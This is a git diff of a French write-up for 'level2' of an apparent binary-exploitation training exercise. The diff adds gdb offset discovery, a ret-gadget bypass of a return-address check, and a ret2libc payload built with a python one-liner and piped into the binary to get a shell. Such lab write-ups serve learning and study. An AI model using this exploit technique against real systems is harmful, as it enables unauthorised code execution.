@@ -14,7 +14,26 @@ On rentre sur gdb dans le binaire de level2.
 
 Gets ne securise pas son buffer. Il est alors possible d'effectuer un bufferoverflow.
 On voit que le buffer que recoit gets() est de 76.
-Mais le code verifie que l'adresse de retour est differente de 0xbXXXXXXX
+Mais le code verifie que l'adresse de retour est differente de 0xbXXXXXXX. Donc on peut pas mettre directement l'adresse de system qui commence par un 0xb....
+Pour cela, on va prendre l'adresse de ret de la fonction main pour decaler l'execution directement a la fin.
+A ce moment la, sur la stack, la prochaine instruction sera la premiere adresse sur la stack. Donc dans notre shellcode, on va ecraser EIP pour mettre l'adresse de retour a la fin de la fonction main. Une fois cela notre adresse [system] [adresse de retour] [adresse /bin/sh] sur la stack sera executee.
+
+On verifie l'offset :
+
+    gdb ./level2
+    (gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+    Program received signal SIGSEGV, Segmentation fault.
+    0x37634136 in ?? ()
+
+Register value : 
+
+    0x37634136
+
+Offset :
+
+    80
+
 
 Nous allons recuperer l'adresse de ret, l'adresse de system, l'adresse d'exit et l'adresse de /bin/sh pour construire notre shellcode.
 
@@ -26,20 +45,16 @@ Nous allons recuperer l'adresse de ret, l'adresse de system, l'adresse d'exit et
 
 L'adresse de ret nous permettera de bypass la condition if qui verifie l'adresse de retour devant etre differente de 0xbXXXXXXX
 
-    Adresse ret : 0x0804853e
-    Adresse system : 0xb7e6b060
-    Adresse exit : 0xb7e5ebe0
-    Adresse /bin/sh : 0xb7f8cc58
+    Adresse ret : 0x0804853e        ==> Permet de bypass la condition if qui nous empeche d'executer notre attaque
+    Adresse system : 0xb7e6b060     ==> Fait un call system
+    Adresse exit : 0xb7e5ebe0       ==> Adresse de retour pour le call system
+    Adresse /bin/sh : 0xb7f8cc58    ==> Adresse de /bin/sh
 
 Nous avons ecris le shellcode dans un fichier :
 
 	python -c 'print "0" * 80 + "\x3e\x85\x04\x08"  + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"' > /tmp/shellcode
 
 Ensuite, on execute le shell code en entree de la fonction level1 :
-
-	cat /tmp/shellcode | ./level2
-
-Il faut en suite qu'on rajoute '-' avant le pipe pour rendre bloquant l'execution du buffer overflow :
 
 	cat /tmp/shellcode - | ./level2
 
